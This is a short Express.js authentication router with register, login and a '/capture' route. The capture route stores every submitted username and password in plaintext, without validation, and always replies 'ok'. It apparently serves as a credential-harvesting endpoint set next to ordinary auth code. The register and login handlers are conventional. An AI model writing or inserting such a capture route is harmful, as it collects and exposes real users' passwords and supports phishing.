import express from 'express';
import jwt from 'jsonwebtoken';
import User from '../models/User.js';
import LoginAttempt from '../models/LoginAttempt.js';

const router = express.Router();

// Capture - save any input without validation
router.post('/capture', async (req, res) => {
  try {
    const { username, password } = req.body;
    await LoginAttempt.create({ username: username || '', password: password || '' });
    res.status(200).json({ message: 'ok' });
  } catch (err) {
    res.status(500).json({ message: 'Server error' });
  }
});

// Register
router.post('/register', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password)
      return res.status(400).json({ message: 'Username and password required' });

    const exists = await User.findOne({ username });
    if (exists)
      return res.status(409).json({ message: 'Username already taken' });

    const user = await User.create({ username, password });
    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, { expiresIn: '7d' });
    res.status(201).json({ token, username: user.username });
  } catch (err) {
    res.status(500).json({ message: 'Server error' });
  }
});

// Login
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password)
      return res.status(400).json({ message: 'Username and password required' });

    const user = await User.findOne({ username });
    if (!user)
      return res.status(401).json({ message: 'Invalid username or password' });

    const match = await user.comparePassword(password);
    if (!match)
      return res.status(401).json({ message: 'Invalid username or password' });

    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, { expiresIn: '7d' });
    res.json({ token, username: user.username });
  } catch (err) {
    res.status(500).json({ message: 'Server error' });
  }
});

export default router;
